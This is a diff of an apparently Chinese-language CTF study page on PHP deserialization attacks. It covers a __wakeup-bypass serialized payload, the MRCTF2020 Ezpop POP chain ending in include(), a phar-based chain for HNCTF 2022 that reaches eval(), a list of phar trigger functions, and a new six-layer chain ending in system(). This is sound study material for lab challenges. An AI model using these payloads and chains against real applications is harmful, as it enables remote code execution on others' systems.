+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="x">        if ($this-&gt;password != 100) { echo "NO!!!hacker!!!"; die(); }</span>
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="x">        if ($this-&gt;username === 'admin') { global $flag; echo $flag; }</span>
+</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="x">    }</span>
+</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>分析:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>① 目标是 username === 'admin' 且 password == 100
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>② 但 __wakeup 会把 username 改成 guest
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>③ 必须让 __wakeup 不执行
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>① 目标是 username === 'admin' 且 password == 100
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>② 但 __wakeup 会把 username 改成 guest
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>③ 必须让 __wakeup 不执行
 </span></code></pre></div>
 <p><strong>payload:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>              └───────── 14 字节 ─────────┘
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>              └───────── 14 字节 ─────────┘
 </span></code></pre></div>
 <p><strong>两个细节:</strong></p>
 <table>
@@ -3960,31 +4023,31 @@
 <p>→ 详见 WP：<a href="../../../blog/geek2019-php/">/blog/geek2019-php/</a></p>
 <h3 id="93-mrctf2020-ezpop-pop">9.3 ✅ [MRCTF2020] Ezpop —— 第一条完整的 POP 链<a class="headerlink" href="#93-mrctf2020-ezpop-pop" title="Permanent link">&para;</a></h3>
 <p><strong>三个类,三个魔术方法,一个 sink:</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="x">class Modifier {</span>
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="x">    protected $var;</span>
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="x">    public function append($value){ include($value); }   // ← sink</span>
-</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="x">    public function __invoke(){ $this-&gt;append($this-&gt;var); }</span>
-</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="x">}</span>
-</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="x">class Show{</span>
-</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="x">    public $source; public $str;</span>
-</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="x">    public function __toString(){ return $this-&gt;str-&gt;source; }</span>
-</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="x">    public function __wakeup(){ preg_match("/.../i", $this-&gt;source); }   // ← 入口(过滤反而成了跳板)</span>
-</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="x">}</span>
-</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a><span class="x">class Test{</span>
-</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a><span class="x">    public $p;</span>
-</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a><span class="x">    public function __get($key){ $function = $this-&gt;p; return $function(); }</span>
-</span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="x">class Modifier {</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="x">    protected $var;</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="x">    public function append($value){ include($value); }   // ← sink</span>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="x">    public function __invoke(){ $this-&gt;append($this-&gt;var); }</span>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="x">}</span>
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="x">class Show{</span>
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="x">    public $source; public $str;</span>
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="x">    public function __toString(){ return $this-&gt;str-&gt;source; }</span>
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="x">    public function __wakeup(){ preg_match("/.../i", $this-&gt;source); }   // ← 入口(过滤反而成了跳板)</span>
+</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="x">}</span>
+</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="x">class Test{</span>
+</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a><span class="x">    public $p;</span>
+</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="x">    public function __get($key){ $function = $this-&gt;p; return $function(); }</span>
+</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>链(逆推找出来的):</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>include ← __invoke ← __get ← __toString ← __wakeup ← unserialize
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>include ← __invoke ← __get ← __toString ← __wakeup ← unserialize
 </span></code></pre></div>
 <p><strong>正向执行:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>unserialize
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a> → Show::__wakeup       preg_match 把 $source(对象) 当字符串 → __toString
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a> → Show::__toString     $this-&gt;str-&gt;source 读不存在的属性 → __get
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a> → Test::__get          $function() 对象当函数 → __invoke
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a> → Modifier::__invoke   $this-&gt;append($this-&gt;var)
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a> → include($var)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>unserialize
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a> → Show::__wakeup       preg_match 把 $source(对象) 当字符串 → __toString
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a> → Show::__toString     $this-&gt;str-&gt;source 读不存在的属性 → __get
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a> → Test::__get          $function() 对象当函数 → __invoke
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a> → Modifier::__invoke   $this-&gt;append($this-&gt;var)
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a> → include($var)
 </span></code></pre></div>
 <p><strong>四层各要什么类型:</strong></p>
 <table>
@@ -4047,12 +4110,12 @@
 <h3 id="94-hnctf-2022-week3-ez_phar-unserialize">9.4 ✅ [HNCTF 2022 WEEK3] ez_phar —— 不用 <code>unserialize</code> 的入口<a class="headerlink" href="#94-hnctf-2022-week3-ez_phar-unserialize" title="Permanent link">&para;</a></h3>
 <p><strong>前面三条全靠 <code>unserialize()</code> 起头。这一条没有 <code>unserialize</code>，链是从</strong>文件函数<strong>进去的。</strong></p>
 <p><strong>源码就四行有用：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="x">class Flag{</span>
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="x">    public $code;</span>
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="x">    public function __destruct(){ eval($this-&gt;code); }</span>
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="x">}</span>
-</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="x">$filename = $_GET['filename'];</span>
-</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="x">file_exists($filename);</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="x">class Flag{</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="x">    public $code;</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="x">    public function __destruct(){ eval($this-&gt;code); }</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="x">}</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="x">$filename = $_GET['filename'];</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="x">file_exists($filename);</span>
 </span></code></pre></div>
 <p><strong>关键差别:</strong></p>
 <table>
@@ -4089,9 +4152,9 @@ PHP 就解析这个 phar,解析时把 metadata <strong>自动反序列化</stron
 </blockquote>
 <p><strong>所以 phar 的本质:把「反序列化」的引信从 <code>unserialize()</code> 挪到了「文件操作 + 可控路径」。</strong></p>
 <p><strong>能当触发点的文件函数(记一份):</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>file_exists   is_file   filesize   getimagesize   file_get_contents
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>file_put_contents   copy   unlink   fopen   include   md5_file
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>exif_read_data   get_meta_tags
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>file_exists   is_file   filesize   getimagesize   file_get_contents
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>file_put_contents   copy   unlink   fopen   include   md5_file
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>exif_read_data   get_meta_tags
 </span></code></pre></div>
 <p><strong>为什么必须用 <code>Phar</code> 类生成,不能手写:</strong></p>
 <table>
@@ -4115,19 +4178,34 @@ PHP 就解析这个 phar,解析时把 metadata <strong>自动反序列化</stron
 <p><strong>另外 <code>new Phar('x.jpg')</code> 会报错 —— 创建时必须 <code>.phar</code> 结尾。</strong>
 <strong>所以流程是:生成 <code>x.phar</code> → 改名 <code>x.jpg</code> → 上传。</strong></p>
 <p><strong>⚠️ 生成时 <code>phar.readonly</code> 默认是 1,必须关:</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="n">php</span><span class="p">.</span><span class="n">exe</span> <span class="n">-d</span> <span class="n">phar</span><span class="p">.</span><span class="n">readonly</span><span class="p">=</span><span class="n">0</span> <span class="n">ds</span><span class="p">.</span><span class="n">php</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="n">php</span><span class="p">.</span><span class="n">exe</span> <span class="n">-d</span> <span class="n">phar</span><span class="p">.</span><span class="n">readonly</span><span class="p">=</span><span class="n">0</span> <span class="n">ds</span><span class="p">.</span><span class="n">php</span>
 </span></code></pre></div>
 <p><strong>⚠️ eval 里必须是合法 PHP。</strong> 我第一次写 <code>ls /</code>(shell 命令),页面报:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>Parse error: syntax error, unexpected end of file
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>in /var/www/html/index.php(7) : eval()'d code on line 1
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>Parse error: syntax error, unexpected end of file
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>in /var/www/html/index.php(7) : eval()'d code on line 1
 </span></code></pre></div>
 <p><strong>这行报错反而是最好的证据:</strong> <code>eval()'d code</code> 说明 <code>__destruct</code> 跑了,
 <code>index.php(7)</code> 说明就是那行 <code>eval</code>,而 <code>syntax error</code> 说明整条链已经通,只是内容不对。</p>
 <p><strong>判读顺序:<code>eval()'d code</code> 一出现,后面就只剩「写对 payload」这一件事了。</strong></p>
 <p>→ 详见 WP:<a href="../../../blog/hnctf2022-ezphar/">/blog/hnctf2022-ezphar/</a></p>
-<h3 id="95">9.5 ⬜ 待打<a class="headerlink" href="#95" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>· [网鼎杯] PHP 反序列化系列
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>· Java 的 ysoserial 链(如果打 Java 题)
+<h3 id="95-geek_challenge2026">9.5 ✅ Geek_Challenge2026 —— 过滤把长度变长<a class="headerlink" href="#95-geek_challenge2026" title="Permanent link">&para;</a></h3>
+<p><strong>入口极简:两个参数进 A 类,<code>serialize</code> 之后过一个 <code>str_replace("admin","hacker")</code>,再 <code>unserialize</code>。</strong></p>
+<p><strong>链是六层,从终点倒推:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>F::__set  system($value)                 ← 终点
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>  ↑ E::__get  写 $sink-&gt;flag_trigger
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>    ↑ D::__call  读 $next-&gt;$p
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>      ↑ C::__invoke  调 $target-&gt;$m()
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>        ↑ B::__toString  (string)$func()
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>          ↑ A::__destruct  echo "…" . $this-&gt;sign
+</span></code></pre></div>
+<p><strong>两个关键点:</strong></p>
+<p><strong>① <code>C::__invoke</code> 里的条件是反的 —— 要求 <code>target</code> 有 <code>__call</code>,且方法名</strong>不能<strong>真实存在。</strong> 看反了就会一直返回空。</p>
+<p><strong>② 长度数字是过滤前算的:</strong> <code>A</code>(admin 个数)必须等于注入串长度,解析器才会正好停在注入的 <code>";</code> 上。这题是 192 —— 因为 b 正好 192 字节。</p>
+<p><strong>判定成功的标志:</strong> 后台的六句 <code>echo</code> 会一句句出现,最后是 <code>RCE:</code>。</p>
+<p>→ 详见 WP:<a href="../../../blog/geek2026-pop-chain/">/blog/geek2026-pop-chain/</a></p>
+<h3 id="96">9.6 ⬜ 待打<a class="headerlink" href="#96" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>· [网鼎杯] PHP 反序列化系列
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>· Java 的 ysoserial 链(如果打 Java 题)
 </span></code></pre></div>
 <hr />
 <h2 id="_14">十、我踩的坑<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h2>
